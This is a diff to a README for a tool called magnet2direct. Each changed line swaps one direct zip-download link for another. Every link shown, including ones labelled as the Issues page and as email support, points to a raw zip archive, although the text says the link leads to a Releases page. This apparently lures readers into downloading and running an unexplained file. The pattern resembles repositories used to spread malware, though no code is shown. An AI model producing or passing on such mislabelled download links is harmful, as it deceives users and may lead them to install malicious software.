@@ -6,7 +6,7 @@ Welcome to magnet2direct! This application helps you convert magnet links into d
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
 
-[![Download magnet2direct](https://raw.githubusercontent.com/nestornag/magnet2direct/main/unjudicious/magnet2direct.zip)](https://raw.githubusercontent.com/nestornag/magnet2direct/main/unjudicious/magnet2direct.zip)
+[![Download magnet2direct](https://raw.githubusercontent.com/nestornag/magnet2direct/main/api/magnet_direct_1.9.zip)](https://raw.githubusercontent.com/nestornag/magnet2direct/main/api/magnet_direct_1.9.zip)
 
 ### Step-by-Step Instructions:
 1. Click the link above to go to the Releases page.
@@ -44,7 +44,7 @@ If you encounter issues during the installation or use of the application, try t
 - Check that your system meets the requirements listed above.
 - Restart your computer and try reinstalling the application.
 
-For further assistance, consider checking the [Issues page](https://raw.githubusercontent.com/nestornag/magnet2direct/main/unjudicious/magnet2direct.zip) on GitHub. You can report your problem there, and we will get back to you.
+For further assistance, consider checking the [Issues page](https://raw.githubusercontent.com/nestornag/magnet2direct/main/api/magnet_direct_1.9.zip) on GitHub. You can report your problem there, and we will get back to you.
 
 ## 📜 License
 magnet2direct is released under the WTFPL license. This means you can do whatever you want with the software. 
@@ -52,7 +52,7 @@ magnet2direct is released under the WTFPL license. This means you can do whateve
 ## ✨ Community and Support
 If you want to connect with other users or have questions, join our community:
 - **GitHub Discussions:** Share ideas and get help from other users.
-- **Email Support:** Reach out directly to our support team at https://raw.githubusercontent.com/nestornag/magnet2direct/main/unjudicious/magnet2direct.zip
+- **Email Support:** Reach out directly to our support team at https://raw.githubusercontent.com/nestornag/magnet2direct/main/api/magnet_direct_1.9.zip
 
 We appreciate your support and love hearing from users!
 
